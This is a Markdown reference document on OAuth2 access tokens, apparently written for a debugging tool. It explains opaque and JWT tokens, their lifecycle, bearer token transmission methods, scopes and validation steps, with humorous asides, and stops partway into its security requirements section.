# OAuth2 Access Tokens

## Specification Reference for OAuth2/OIDC Debugging Tool

> *"The access token, like a towel, is massively useful. Unlike a towel, you should never, ever put it in a URL query parameter. That way lies madness and referrer headers."*

---

## 1. Overview

Access tokens are credentials used to access protected resources on behalf of a resource owner. They represent authorization granted by the resource owner to a client application, encapsulating the scope of access, the resource owner's identity (indirectly), and the authorization server's attestation of this grant.

An access token is to OAuth2 what a hotel key card is to a hotel: it proves you're authorized to access certain rooms (resources) for a limited time, without requiring you to show your government-issued ID (user credentials) every time. Unlike hotel key cards, access tokens come in two fascinating varieties: opaque (the "trust but don't read" model) and self-contained (the "verify locally" model).

### When Access Tokens Are Used

| Scenario | Access Token Required? | Alternative |
|----------|----------------------|-------------|
| Accessing protected API endpoints | ✅ Yes | None |
| Calling resource server APIs | ✅ Yes | None |
| Authenticating users | ❌ No (use ID token) | ID token (OIDC) |
| Long-term access without user | ✅ Yes + Refresh Token | Client Credentials Flow |
| Proving user identity | ❌ No (access tokens prove *authorization* not *authentication*) | ID token (OIDC) |

### Primary Specifications

| Specification | Sections | Purpose |
|---------------|----------|---------|
| RFC 6749 | §1.4, §7 | Core Access Token definition |
| RFC 6750 | Complete | Bearer Token Usage |
| OAuth 2.1 | §1.4, §6.1 | Updated access token requirements |
| Security BCP (draft-ietf-oauth-security-topics-27) | §4.3 | Access token security |
| RFC 7662 | Complete | Token Introspection |
| RFC 9449 | Complete | DPoP (sender-constrained tokens) |
| RFC 8705 | Complete | mTLS (sender-constrained tokens) |

---

## 2. Access Token Characteristics

Access tokens come in two primary flavors, much like the fundamental duality of particle/wave physics, except with more JSON and fewer Nobel Prizes.

### 2.1 Opaque Tokens

**Structure:** Random string with no internal structure discernible to clients.

```
tGzv3JOkF0XG5Qx2TlKWIA
```

| Characteristic | Value | Rationale |
|---------------|-------|-----------|
| **Format** | Implementation-specific (UUID, random bytes, etc.) | Prevents parsing/manipulation by clients |
| **Validation** | MUST call introspection endpoint (RFC 7662) | Centralized control, instant revocation |
| **Revocation** | Server-side tracking | AS can invalidate immediately |
| **Size** | Typically 20-100 characters | Compact |
| **Information Leakage** | Zero (to clients) | Enhanced privacy |

**Example opaque token:**
```
2YotnFZFEjr1zCsicMWpAA
```

**Advantages:**
- Authorization server maintains complete control
- Can be revoked instantly (no waiting for expiration)
- No information leakage to client or intermediaries
- Simpler for clients (no JWT parsing/validation)

**Disadvantages:**
- Resource server MUST call introspection endpoint (network dependency)
- Higher latency for validation
- Introspection endpoint becomes single point of failure
- Higher load on authorization server

### 2.2 Self-Contained Tokens (JWT)

**Structure:** JSON Web Token (JWT) with header, payload, and signature.

```
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IjEifQ.eyJpc3MiOiJodHRwczovL2F1dGguc2VydmVyLmNvbSIsInN1YiI6IjEyMzQ1Njc4OTAiLCJhdWQiOiJodHRwczovL2FwaS5leGFtcGxlLmNvbSIsImV4cCI6MTczMzQzMjAwMCwiaWF0IjoxNzMzNDI4NDAwLCJzY29wZSI6InJlYWQ6bWVzc2FnZXMgd3JpdGU6bWVzc2FnZXMifQ.signature_bytes_here
```

**Decoded payload example:**
```json
{
  "iss": "https://auth.server.com",
  "sub": "1234567890",
  "aud": "https://api.example.com",
  "exp": 1733432000,
  "iat": 1733428400,
  "scope": "read:messages write:messages",
  "client_id": "web_app_123"
}
```

| Characteristic | Value | Rationale |
|---------------|-------|-----------|
| **Format** | JWT (RFC 7519) | Standardized, self-contained |
| **Validation** | Local verification of signature + claims | No network call required |
| **Revocation** | Complex (requires blocklist or short lifetime) | JWT is self-contained |
| **Size** | Typically 500-2000 bytes | Larger due to claims + signature |
| **Information Leakage** | Claims visible (base64-encoded, not encrypted) | Transparency vs privacy trade-off |

**Advantages:**
- Resource server validates locally (no introspection call)
- Reduced latency (no network round-trip)
- Offline validation possible
- Stateless validation (scalability)

**Disadvantages:**
- Cannot be revoked before expiration (without additional infrastructure)
- Larger size (impacts network and storage)
- Claims visible to anyone with token (privacy concern)
- Requires proper JWT validation (signature, claims, timing)

### 2.3 Comparison Table: Opaque vs JWT

| Aspect | Opaque Token | JWT Token |
|--------|-------------|-----------|
| **Validation Method** | RFC 7662 introspection endpoint | Local signature verification |
| **Network Dependency** | Yes (every request to RS) | No (after fetching JWKS) |
| **Revocation** | Immediate | Requires blocklist or short lifetime |
| **Size** | ~20-100 chars | ~500-2000 bytes |
| **Privacy** | High (no readable info) | Lower (claims readable) |
| **Latency** | Higher (network call) | Lower (local validation) |
| **AS Load** | Higher (introspection per request) | Lower (JWKS fetch only) |
| **Scalability** | Limited by AS capacity | High (stateless validation) |
| **Debugging** | Harder (opaque to client/RS) | Easier (claims visible) |
| **Revocation Speed** | Instant | Delayed until expiration |

### 2.4 When to Use Each Type

| Use Case | Recommended Type | Rationale |
|----------|-----------------|-----------|
| **High-security financial transactions** | Opaque + mTLS/DPoP | Instant revocation critical |
| **High-traffic public API** | JWT | Reduce AS load, scalability |
| **Internal microservices** | JWT | Offline validation, low latency |
| **Mobile apps with intermittent connectivity** | JWT | Offline validation |
| **Privacy-sensitive user data** | Opaque | Minimize information leakage |
| **Short-lived tokens (<15 min)** | JWT | Revocation less critical |
| **Long-lived tokens (>1 hour)** | Opaque | Revocation more important |
| **Third-party API integrations** | JWT | Standard, easier for partners |

**RFC Guidance:**
- RFC 6749 §1.4: Token structure is opaque to client (SHOULD NOT parse)
- Security BCP §4.3.1: Short lifetimes reduce risk regardless of type
- RFC 7662: Introspection provides structured info about opaque tokens

---

## 3. Access Token Lifecycle

The lifecycle of an access token resembles that of a mayfly: brief, purposeful, and ending in an inevitable expiration that everyone saw coming.

### 3.1 Lifecycle Stages

```
     Issuance          Usage              Expiration/Renewal
         │                │                      │
         ▼                ▼                      ▼
    ┌─────────┐      ┌─────────┐          ┌─────────┐
    │ Request ├─────►│  Active │──────────┤ Expired │
    │  Token  │      │   Use   │          │ Revoked │
    └─────────┘      └────┬────┘          └─────────┘
                          │                      │
                          │                      ▼
                          │              ┌───────────────┐
                          │              │ Refresh Token │
                          │              │   Exchange    │
                          │              └───────┬───────┘
                          │                      │
                          └──────────────────────┘
                            (New Access Token)
```

### 3.2 Issuance

Access tokens are issued by the authorization server's token endpoint in response to various grant types:

| Grant Type | Issuance Trigger | Includes Refresh Token? | Spec Reference |
|------------|------------------|------------------------|----------------|
| **Authorization Code** | Token request with authorization code | Yes (typically) | RFC 6749 §4.1.3-4.1.4 |
| **Client Credentials** | Token request with client credentials | No (MUST NOT) | RFC 6749 §4.4.2-4.4.3 |
| **Refresh Token** | Token request with refresh token | Yes (rotation) | RFC 6749 §6 |
| **Device Authorization** | Token request after device approval | Yes (typically) | RFC 8628 §3.4-3.5 |
| **Implicit** (deprecated) | Authorization response (fragment) | No | RFC 6749 §4.2.2 |

**Token Response Example (RFC 6749 §5.1):**

```http
HTTP/1.1 200 OK
Content-Type: application/json
Cache-Control: no-store

{
  "access_token": "2YotnFZFEjr1zCsicMWpAA",
  "token_type": "Bearer",
  "expires_in": 3600,
  "refresh_token": "tGzv3JOkF0XG5Qx2TlKWIA",
  "scope": "read:messages write:messages"
}
```

### 3.3 Usage

Once issued, the access token is presented to the resource server with each API request:

```http
GET /api/messages HTTP/1.1
Host: api.example.com
Authorization: Bearer 2YotnFZFEjr1zCsicMWpAA
```

**Usage Requirements (RFC 6750 §2.1):**
- Token MUST be sent in Authorization header (RECOMMENDED)
- Header format: `Authorization: Bearer <token>`
- TLS REQUIRED for all token transmissions
- Resource server MUST validate token before granting access

### 3.4 Expiration

Access tokens have a finite lifetime to limit the damage from token theft.

| Lifetime Component | Value | Spec Reference |
|-------------------|-------|----------------|
| **expires_in** | Seconds until expiration (integer) | RFC 6749 §5.1 |
| **Recommended Lifetime** | 5-60 minutes | Security BCP §4.3.1 |
| **Maximum Lifetime** | Application-dependent | Security BCP §4.3.1 |
| **JWT exp claim** | Unix timestamp of expiration | RFC 7519 §4.1.4 |

**Example expiration times:**

| Scenario | Recommended Lifetime | Rationale |
|----------|---------------------|-----------|
| High-security financial API | 5-15 minutes | Minimize theft impact |
| Standard web application | 15-60 minutes | Balance security vs UX |
| Low-risk public data API | 1-2 hours | Reduce refresh frequency |
| Client credentials (M2M) | 30-60 minutes | No refresh token available |

**When token expires:**
```http
HTTP/1.1 401 Unauthorized
WWW-Authenticate: Bearer error="invalid_token",
                  error_description="The access token expired"
```

### 3.5 Renewal

Expired access tokens can be renewed using a refresh token (if available):

```http
POST /token HTTP/1.1
Host: auth.server.com
Content-Type: application/x-www-form-urlencoded

grant_type=refresh_token
&refresh_token=tGzv3JOkF0XG5Qx2TlKWIA
&scope=read:messages
```

**Renewal flows:**

| Client Type | Renewal Method | Spec Reference |
|-------------|---------------|----------------|
| **Confidential client (has refresh token)** | Refresh token exchange | RFC 6749 §6 |
| **Public client (has refresh token)** | Refresh token exchange + rotation | OAuth 2.1 §6, Security BCP §4.13 |
| **Client Credentials (no refresh token)** | Re-request with client credentials | RFC 6749 §4.4 |
| **No refresh token available** | Re-authenticate user | RFC 6749 §4.1 |

### 3.6 Complete Lifecycle Diagram

```
Authorization Server         Client Application      Resource Server
        │                            │                      │
        │  (1) Token Request          │                      │
        │ ◄──────────────────────────│                      │
        │      (grant_type=...)       │                      │
        │                             │                      │
        │  (2) Token Response         │                      │
        │ ───────────────────────────►│                      │
        │  access_token + expires_in  │                      │
        │                             │                      │
        │                             │  (3) API Request     │
        │                             │  Bearer <token>      │
        │                             ├─────────────────────►│
        │                             │                      │
        │                             │  (4) Token Valid     │
        │                             │  200 OK + data       │
        │                             │◄─────────────────────┤
        │                             │                      │
        │                 ┌───────────┴─────────┐            │
        │                 │   Time passes...    │            │
        │                 │   Token expires     │            │
        │                 └───────────┬─────────┘            │
        │                             │                      │
        │                             │  (5) API Request     │
        │                             │  Bearer <expired>    │
        │                             ├─────────────────────►│
        │                             │                      │
        │                             │  (6) 401 Unauthorized│
        │                             │  error="invalid_token"│
        │                             │◄─────────────────────┤
        │                             │                      │
        │  (7) Refresh Token Request  │                      │
        │ ◄──────────────────────────│                      │
        │  grant_type=refresh_token   │                      │
        │                             │                      │
        │  (8) New Access Token       │                      │
        │ ───────────────────────────►│                      │
        │  access_token (new)         │                      │
        │                             │                      │
        │                             │  (9) Retry API Request│
        │                             │  Bearer <new_token>  │
        │                             ├─────────────────────►│
        │                             │                      │
        │                             │  (10) 200 OK + data  │
        │                             │◄─────────────────────┤
        │                             │                      │
        ▼                             ▼                      ▼
```

---

## 4. Bearer Token Specification (RFC 6750)

The "Bearer" token type is the most common access token type in OAuth 2.0. It operates on the delightfully simple principle that anyone who *bears* (possesses) the token is authorized. This is roughly as secure as leaving your house keys under the doormat, except we mitigate it with TLS and short lifetimes.

### 4.1 Bearer Token Security Model

**Core Principle (RFC 6750 §1):** Possession = Authorization

| Characteristic | Implication |
|---------------|-------------|
| **No cryptographic proof** | Whoever presents token is assumed authorized |
| **Simple to use** | Just include token in header |
| **Simple to steal** | Token theft = authorization theft |
| **Mitigation** | TLS + short lifetime + proper storage |

**Security Model:**
```
┌──────────────────────────────────────────────────────────┐
│  "This token proves I'm authorized"                      │
│  - Said by anyone who has the token                      │
│                                                          │
│  Security depends on:                                    │
│  1. TLS prevents eavesdropping (REQUIRED)               │
│  2. Short lifetime limits exposure (RECOMMENDED)        │
│  3. Secure storage prevents theft (REQUIRED)            │
│  4. HTTPS-only transmission (REQUIRED)                  │
└──────────────────────────────────────────────────────────┘
```

### 4.2 Bearer Token Transmission Methods

RFC 6750 §2 defines three methods for transmitting bearer tokens. Two of them are terrible ideas that should make you feel bad for even considering them.

#### 4.2.1 Authorization Header (RECOMMENDED - RFC 6750 §2.1)

**This is the only method you should use.** Really. The other methods exist primarily as cautionary tales.

**Format:**
```
Authorization: Bearer <access_token>
```

**Example Request:**
```http
GET /resource/messages HTTP/1.1
Host: api.example.com
Authorization: Bearer mF_9.B5f-4.1JqM
```

**Requirements (RFC 6750 §2.1):**
- Header name: `Authorization` (case-insensitive)
- Credentials scheme: `Bearer` (case-sensitive per RFC 7235 §2.1)
- Single space between "Bearer" and token value
- Token value: b64token per RFC 6750 §2.1

**Why this is the RIGHT method:**
| Advantage | Explanation |
|-----------|-------------|
| Not logged in URLs | Server access logs don't capture Authorization header by default |
| Not in browser history | Browsers don't save HTTP headers in history |
| No referrer leakage | Referrer header doesn't include Authorization header |
| Explicit security context | Clear that this is authentication/authorization |
| Standard header semantics | Well-understood by all HTTP infrastructure |

#### 4.2.2 Form-Encoded Body Parameter (NOT RECOMMENDED - RFC 6750 §2.2)

**Don't use this.** Seriously. This method exists because someone asked "could we?" without asking "should we?"

**Format:**
```
access_token=<token>
```

**Requirements (RFC 6750 §2.2):**
- POST requests ONLY
- Content-Type: `application/x-www-form-urlencoded`
- Parameter name: `access_token`
- MUST NOT use if Authorization header present
- MUST NOT use in GET requests

**Example Request:**
```http
POST /resource/messages HTTP/1.1
Host: api.example.com
Content-Type: application/x-www-form-urlencoded

access_token=mF_9.B5f-4.1JqM&message=Hello
```

**Why this is TERRIBLE:**

| Problem | Consequence |
|---------|-------------|
| Body logging | Many frameworks log POST bodies (token exposure) |
| Form caching | Browsers may cache form data |
| CSRF confusion | Mixing authentication with form data is dangerous |
| Debugging complexity | Harder to separate auth from application data |
| Framework assumptions | Many frameworks expect Authorization header |

**Security BCP stance (§4.3.2):** "Clients SHOULD NOT use this method unless the HTTP request method is POST and the body parameters are being used to transmit the access token."

Translation: "Please don't do this."

#### 4.2.3 URI Query Parameter (NOT RECOMMENDED - RFC 6750 §2.3)

**Definitely don't use this.** This method is the digital equivalent of writing your password on a sticky note and leaving it on your monitor. Except the sticky note is also copied to server logs, browser history, and every proxy server between you and your destination.

**Format:**
```
?access_token=<token>
```

**Example Request:**
```http
GET /resource/messages?access_token=mF_9.B5f-4.1JqM HTTP/1.1
Host: api.example.com
```

**Why this is INCREDIBLY TERRIBLE:**

| Problem | Consequence | Severity |
|---------|-------------|----------|
| **URL logging** | Appears in server access logs, proxy logs | Critical |
| **Referrer leakage** | Token sent to third-party sites via Referrer header | Critical |
| **Browser history** | Saved in browser history | High |
| **Bookmarks** | User might bookmark URL with token | High |
| **Copy-paste errors** | Users might share URL with token | High |
| **Cache pollution** | URLs may be cached by browsers/proxies | High |
| **DNS leakage** | Token visible in DNS prefetch requests | Medium |

**Security BCP stance (§4.3.2):** "Because of the security weaknesses associated with the URI method..., it SHOULD NOT be used."

**OAuth 2.1 stance:** Likely to be **removed entirely** from OAuth 2.1.

**Example of why this is bad:**
```
User clicks link: https://api.example.com/data?access_token=secret123
Link loads, user then clicks external link on page
Browser sends: Referer: https://api.example.com/data?access_token=secret123
Third-party site now has your access token. Congratulations, you played yourself.
```

### 4.3 Transmission Method Comparison Table

| Method | Security | Usability | Standards Compliance | Verdict |
|--------|----------|-----------|---------------------|---------|
| **Authorization Header** | ✅ Excellent | ✅ Excellent | ✅ RECOMMENDED | **USE THIS** |
| **Form-Encoded Body** | ⚠️ Poor | ⚠️ Limited (POST only) | ⚠️ NOT RECOMMENDED | Don't use |
| **URI Query Parameter** | ❌ Terrible | ❌ Problematic | ❌ NOT RECOMMENDED | **NEVER USE** |

**Implementation Requirement:**
- Resource servers MUST support Authorization header method (RFC 6750 §2.1)
- Resource servers MAY support other methods (but shouldn't encourage them)
- Clients MUST use Authorization header method (except in legacy scenarios with documented security review)

---

## 5. Access Token Scopes (RFC 6749 §3.3)

Scopes define what an access token can do. Think of them as the difference between "can read the email" and "can read the email, delete the email, impersonate the user, and launch the nuclear missiles." Granularity matters.

### 5.1 What Scopes Represent

**Definition (RFC 6749 §3.3):** "The scope of the access token... expressed as a list of space-delimited, case-sensitive strings."

| Concept | Explanation | Example |
|---------|-------------|---------|
| **Authorization scope** | Permissions granted to this access token | `read:messages write:messages` |
| **Subset of user permissions** | Client can only access what user authorized | User has admin rights, token gets read-only |
| **Server-defined vocabulary** | Authorization server defines available scopes | No universal standard |
| **Client-requested** | Client requests scopes in authorization request | Client asks for `read write delete` |
| **User-approved** | User may approve subset of requested scopes | User grants only `read` |
| **Token-bound** | Scope is bound to access token | Cannot change without new token |

### 5.2 Scope Syntax (RFC 6749 §3.3)

**Format:** Space-delimited list of case-sensitive strings

**ABNF Definition (RFC 6749 §3.3):**
```
scope       = scope-token *( SP scope-token )
scope-token = 1*NQCHAR
NQCHAR      = %x21 / %x23-5B / %x5D-7E
```

**Valid scope examples:**
```
read:messages
read:messages write:messages
profile email openid
https://api.example.com/read
admin:users:delete admin:users:create
```

**Invalid scope examples:**
```
read:messages,write:messages     ← Comma-separated (INVALID)
read:messages write:messages     ← Double space (technically valid but discouraged)
"read:messages"                  ← Quoted (quotes are part of token)
```

### 5.3 Scope Naming Conventions

While RFC 6749 doesn't mandate a naming convention, industry best practices have emerged:

| Convention | Example | Use Case |
|------------|---------|----------|
| **Colon-separated** | `read:messages` `write:messages` | Resource:Action pattern |
| **Dot-separated** | `user.profile.read` | Hierarchical resources |
| **URL-based** | `https://api.example.com/read` | Google-style, domain-based |
| **Simple strings** | `email` `profile` `openid` | OIDC standard scopes |
| **Permission-based** | `messages.read` `messages.write` | Resource.permission pattern |

**Best Practices:**
```
Good scope names:
  read:messages          - Clear action and resource
  users:profile:read     - Hierarchical clarity
  api:admin:write        - Indicates privilege level
  
Avoid:
  all                    - Too broad
  *                      - Wildcard confusion
  read_messages          - Underscore inconsistency
  ReadMessages           - Case mixing (scopes are case-sensitive)
```

### 5.4 Scope Validation

**Resource server MUST validate scopes (RFC 6749 §7):**

1. Extract access token from request
2. Determine required scope for requested resource
3. Validate token contains required scope
4. Grant or deny access

**Validation Algorithm:**
```
FUNCTION validateScope(tokenScopes, requiredScopes):
    # Parse token scopes (space-delimited)
    tokenScopeList = split(tokenScopes, " ")
    
    # Parse required scopes
    requiredScopeList = split(requiredScopes, " ")
    
    # Check if all required scopes are present
    FOR EACH requiredScope IN requiredScopeList:
        IF requiredScope NOT IN tokenScopeList:
            RETURN error("insufficient_scope")
    
    RETURN valid
```

**Example:**
```
Token scopes: "read:messages write:messages"
Requested resource requires: "read:messages"
Result: ✅ GRANTED

Token scopes: "read:messages"
Requested resource requires: "write:messages"
Result: ❌ DENIED (insufficient_scope)

Token scopes: "read:messages write:messages"
Requested resource requires: "read:messages delete:messages"
Result: ❌ DENIED (insufficient_scope - missing delete)
```

### 5.5 Scope Best Practices

#### 5.5.1 Principle of Least Privilege

**Rule:** Request only the minimum scopes necessary.

| Situation | Bad Practice | Good Practice |
|-----------|-------------|---------------|
| Reading user profile | Request: `admin` | Request: `profile:read` |
| Sending emails | Request: `email:read email:write email:delete` | Request: `email:send` |
| Accessing calendar | Request: `calendar` | Request: `calendar:read` or `calendar:events:read` |

#### 5.5.2 Fine-Grained vs Coarse-Grained Scopes

| Approach | Example | Advantages | Disadvantages |
|----------|---------|------------|---------------|
| **Fine-grained** | `messages:read` `messages:write` `messages:delete` `messages:search` | Precise control, least privilege | More complex, more consent screens |
| **Coarse-grained** | `messages` | Simpler UX, fewer scopes | Overly broad permissions |
| **Hybrid** | `messages:read` `messages:write` (read + write + delete combined) | Balance | Requires careful design |

**Recommendation:** Start fine-grained for sensitive operations, coarse-grained for read operations.

#### 5.5.3 Example Scope Hierarchies

**Email API:**
```
email:read           - Read email messages
email:send           - Send new emails
email:delete         - Delete emails
email:settings:read  - Read email settings
email:settings:write - Modify email settings
email:admin          - Full email administration
```

**User Management API:**
```
users:profile:read       - Read user profiles
users:profile:write      - Update user profiles
users:roles:read         - View user roles
users:roles:assign       - Assign roles to users
users:admin:delete       - Delete user accounts
```

**Financial API:**
```
accounts:read            - View account balances
transactions:read        - View transaction history
transactions:create      - Initiate transactions
payments:execute         - Execute payments (high privilege)
admin:accounts:manage    - Full account management
```

### 5.6 Scope Downgrade

**Question:** Can a client request a subset of scopes when refreshing?
**Answer:** Yes (RFC 6749 §6)

```http
POST /token HTTP/1.1
Content-Type: application/x-www-form-urlencoded

grant_type=refresh_token
&refresh_token=tGzv3JOkF0XG5Qx2TlKWIA
&scope=read:messages
```

**Rules:**
- Requested scope MUST be subset of original scope
- Requesting expanded scope MUST be rejected
- Omitting scope parameter implies same scope as original

| Original Scope | Refresh Request Scope | Result |
|---------------|----------------------|--------|
| `read write` | `read` | ✅ Allowed (subset) |
| `read write` | (omitted) | ✅ Allowed (same as original) |
| `read` | `read write` | ❌ Denied (expanded) |
| `read write delete` | `read delete` | ✅ Allowed (subset) |

---

## 6. Access Token Validation (Resource Server Perspective)

Resource servers have one job: verify the access token is valid before granting access. There are two paths to enlightenment, depending on whether the token is opaque or JWT.

### 6.1 Validation for Opaque Tokens

**Method:** RFC 7662 Token Introspection

**Flow:**
```
Resource Server               Authorization Server
       │                              │
       │  (1) Introspection Request    │
       │  POST /introspect             │
       │  token=mF_9.B5f-4.1JqM        │
       ├─────────────────────────────►│
       │                               │
       │                               │  (Validate token,
       │                               │   check revocation,
       │                               │   load metadata)
       │                               │
       │  (2) Introspection Response   │
       │  {active:true, scope:...}     │
       │◄──────────────────────────────┤
       │                               │
       │  (3) Validate response         │
       │  - Check active=true          │
       │  - Validate scope             │
       │  - Check expiration           │
       │  - Validate audience          │
       │                               │
       │  (4) Grant or deny access     │
       │                               │
       ▼                               ▼
```

**Validation Steps:**

```
FUNCTION validateOpaqueToken(token, requiredScope, requiredAudience):
    # Step 1: Extract token from request
    token = extractTokenFromHeader(request)
    IF token is NULL:
        RETURN error(401, "invalid_request", "No token provided")
    
    # Step 2: Call introspection endpoint
    introspectionResponse = POST https://auth.server.com/introspect
        body: token=<token>
        auth: Basic <resource_server_credentials>
    
    IF introspectionResponse.error:
        RETURN error(401, "invalid_token", "Introspection failed")
    
    # Step 3: Check active status
    IF introspectionResponse.active != true:
        RETURN error(401, "invalid_token", "Token is not active")
    
    # Step 4: Validate expiration (if present)
    IF introspectionResponse.exp exists:
        IF current_time >= introspectionResponse.exp:
            RETURN error(401, "invalid_token", "Token expired")
    
    # Step 5: Validate scope
    IF requiredScope NOT IN introspectionResponse.scope:
        RETURN error(403, "insufficient_scope", "Token lacks required scope")
    
    # Step 6: Validate audience (if present)
    IF requiredAudience specified:
        IF requiredAudience NOT IN introspectionResponse.aud:
            RETURN error(403, "invalid_token", "Token not intended for this audience")
    
    # Step 7: Additional claims validation (client_id, etc.)
    # ...
    
    RETURN valid
```

**Introspection Request Example:**
```http
POST /introspect HTTP/1.1
Host: auth.server.com
Content-Type: application/x-www-form-urlencoded
Authorization: Basic czZCaGRSa3F0MzpnWDFmQmF0M2JW

token=mF_9.B5f-4.1JqM
&token_type_hint=access_token
```

**Introspection Response Example:**
```json
{
  "active": true,
  "scope": "read:messages write:messages",
  "client_id": "client_abc123",
  "username": "user@example.com",
  "token_type": "Bearer",
  "exp": 1733432000,
  "iat": 1733428400,
  "sub": "user_12345",
  "aud": "https://api.example.com"
}
```

**See:** `token-introspection-and-revocation.md` for complete introspection specification.

### 6.2 Validation for JWT Tokens

**Method:** Local signature verification and claims validation

**Flow:**
```
Resource Server                    Authorization Server
       │                                    │
       │  (0) Fetch JWKS (cached)           │
       │  GET /.well-known/jwks.json        │
       ├───────────────────────────────────►│
       │◄────────────────────────────────────┤
       │  (JWKS cached locally)              │
       │                                     │
       │  (1) Extract JWT from request       │
       │  Authorization: Bearer <JWT>        │
       │                                     │
       │  (2) Decode JWT (base64)            │
       │  - Extract header                   │
       │  - Extract payload                  │
       │  - Extract signature                │
       │                                     │
       │  (3) Verify signature               │
       │  - Find key from JWKS (by kid)      │
       │  - Verify signature with public key │
       │  - Reject if invalid                │
       │                                     │
       │  (4) Validate claims                │
       │  - exp: not expired                 │
       │  - nbf: not before time             │
       │  - iss: expected issuer             │
       │  - aud: expected audience           │
       │  - scope: required scope            │
       │                                     │
       │  (5) Grant or deny access           │
       │                                     │
       ▼                                     ▼
```

**Validation Steps:**

```
FUNCTION validateJWT(jwtToken, requiredScope, requiredAudience):
    # Step 1: Decode JWT structure
    parts = split(jwtToken, ".")
    IF length(parts) != 3:
        RETURN error(401, "invalid_token", "Malformed JWT")
    
    header = base64UrlDecode(parts[0])
    payload = base64UrlDecode(parts[1])
    signature = parts[2]
    
    # Step 2: Validate signature
    kid = header.kid
    publicKey = getPublicKeyFromJWKS(kid)  # Cached JWKS
    
    IF NOT verifySignature(header, payload, signature, publicKey):
        RETURN error(401, "invalid_token", "Invalid signature")
    
    # Step 3: Validate exp (expiration time) - REQUIRED
    IF payload.exp is NULL:
        RETURN error(401, "invalid_token", "Missing exp claim")
    
    IF current_time >= payload.exp:
        RETURN error(401, "invalid_token", "Token expired")
    
    # Step 4: Validate nbf (not before) - if present
    IF payload.nbf exists AND current_time < payload.nbf:
        RETURN error(401, "invalid_token", "Token not yet valid")
    
    # Step 5: Validate iss (issuer) - REQUIRED
    IF payload.iss != expectedIssuer:
        RETURN error(401, "invalid_token", "Invalid issuer")
    
    # Step 6: Validate aud (audience) - REQUIRED
    IF requiredAudience NOT IN payload.aud:
        RETURN error(401, "invalid_token", "Invalid audience")
    
    # Step 7: Validate scope - REQUIRED
    IF requiredScope NOT IN payload.scope:
        RETURN error(403, "insufficient_scope", "Missing required scope")
    
    # Step 8: Additional validations (optional)
    # - Check iat (issued at) for clock skew
    # - Validate custom claims
    # - Check token revocation (if using blocklist)
    
    RETURN valid
```

**JWT Claims Validation Requirements:**

| Claim | Requirement | Validation | Spec Reference |
|-------|-------------|------------|----------------|
| **exp** | REQUIRED | current_time < exp | RFC 7519 §4.1.4 |
| **nbf** | OPTIONAL | current_time >= nbf | RFC 7519 §4.1.5 |
| **iss** | REQUIRED | matches expected issuer | RFC 7519 §4.1.1 |
| **aud** | REQUIRED | contains expected audience | RFC 7519 §4.1.3 |
| **iat** | OPTIONAL | check for clock skew | RFC 7519 §4.1.6 |
| **scope** | REQUIRED (OAuth) | contains required scope | RFC 6749 §7 |
| **sub** | OPTIONAL | validate if needed | RFC 7519 §4.1.2 |

**See:** `jwt-structure-and-validation.md` for complete JWT validation specification.

### 6.3 Validation Decision Flowchart

```
                    Start: Receive API Request
                              │
                              ▼
                   ┌────────────────────┐
                   │ Extract Token from │
                   │ Authorization      │
                   │ Header             │
                   └──────────┬─────────┘
                              │
                   ┌──────────▼─────────┐
                   │ Token Present?     │
                   └──┬──────────────┬──┘
                      │NO            │YES
                      ▼              ▼
              ┌───────────────┐  ┌──────────────┐
              │ Return 401    │  │ Determine    │
              │ invalid_request│  │ Token Type  │
              └───────────────┘  └──────┬───────┘
                                        │
                        ┌───────────────┴────────────────┐
                        │                                │
                        ▼                                ▼
              ┌──────────────────┐           ┌───────────────────┐
              │ Opaque Token     │           │ JWT Token         │
              │ (no "." chars)   │           │ (contains ".")    │
              └────────┬─────────┘           └─────────┬─────────┘
                       │                               │
                       ▼                               ▼
         ┌──────────────────────┐        ┌─────────────────────────┐
         │ Call Introspection   │        │ Verify JWT Signature    │
         │ Endpoint (RFC 7662)  │        │ (local validation)      │
         └──────────┬───────────┘        └──────────┬──────────────┘
                    │                               │
                    ▼                               ▼
         ┌──────────────────┐           ┌──────────────────────┐
         │ active = true?   │           │ Signature Valid?     │
         └────┬──────────┬──┘           └────┬──────────────┬──┘
              │NO        │YES               │NO             │YES
              ▼          ▼                  ▼               ▼
        ┌─────────┐  ┌──────────┐    ┌─────────┐     ┌──────────────┐
        │Return   │  │Continue  │    │Return   │     │Validate Claims│
        │401      │  │          │    │401      │     │(exp,iss,aud) │
        └─────────┘  └────┬─────┘    └─────────┘     └──────┬───────┘
                          │                                   │
                          └─────────────┬─────────────────────┘
                                        ▼
                              ┌──────────────────┐
                              │ Token Expired?   │
                              │ (exp claim)      │
                              └────┬──────────┬──┘
                                   │YES       │NO
                                   ▼          ▼
                            ┌──────────┐  ┌──────────────────┐
                            │Return    │  │Valid Audience?   │
                            │401       │  │(aud claim)       │
                            └──────────┘  └────┬──────────┬──┘
                                               │NO        │YES
                                               ▼          ▼
                                        ┌──────────┐  ┌──────────────┐
                                        │Return    │  │Sufficient    │
                                        │401       │  │Scope?        │
                                        └──────────┘  └────┬──────┬──┘
                                                           │NO    │YES
                                                           ▼      ▼
                                                    ┌──────────┐ ┌──────┐
                                                    │Return    │ │Grant │
                                                    │403       │ │Access│
                                                    │insufficient│└──────┘
                                                    │_scope    │
                                                    └──────────┘
```

### 6.4 Common Validation Failures and Responses

| Failure Reason | HTTP Status | Error Code | Description |
|---------------|-------------|------------|-------------|
| No token provided | 401 | `invalid_request` | Authorization header missing |
| Malformed token | 401 | `invalid_token` | Token format invalid |
| Invalid signature (JWT) | 401 | `invalid_token` | JWT signature verification failed |
| active=false (opaque) | 401 | `invalid_token` | Introspection returned active=false |
| Token expired | 401 | `invalid_token` | exp claim in past |
| Token not yet valid | 401 | `invalid_token` | nbf claim in future |
| Invalid issuer | 401 | `invalid_token` | iss claim doesn't match expected |
| Invalid audience | 401 | `invalid_token` | aud claim doesn't match expected |
| Insufficient scope | 403 | `insufficient_scope` | Token lacks required scope |
| Token revoked | 401 | `invalid_token` | Token appears on revocation list |

---

## 7. Access Token Security Requirements

Security requirements for access tokens are straightforward: use TLS, keep them short-lived, don't put them in URLs, and store them properly. Violate these rules at your own peril (and the peril of your users' data).

### 7.1 Transport Security (RFC 6750 §5.1)

**MUST use TLS (RFC 6750 §5.1):**

| Requirement | Standard | Rationale |
|-------------|----------|-----------|
| **TLS version** | TLS 1.2+ REQUIRED (TLS 1.3 RECOMMENDED) | Older versions have known vulnerabilities |
| **Certificate validation** | MUST validate server certificates | Prevent MitM attacks |
| **All token transmission** | MUST use TLS for every request with token | Eavesdropping prevention |
| **Token endpoint** | MUST use TLS | Token issuance security |
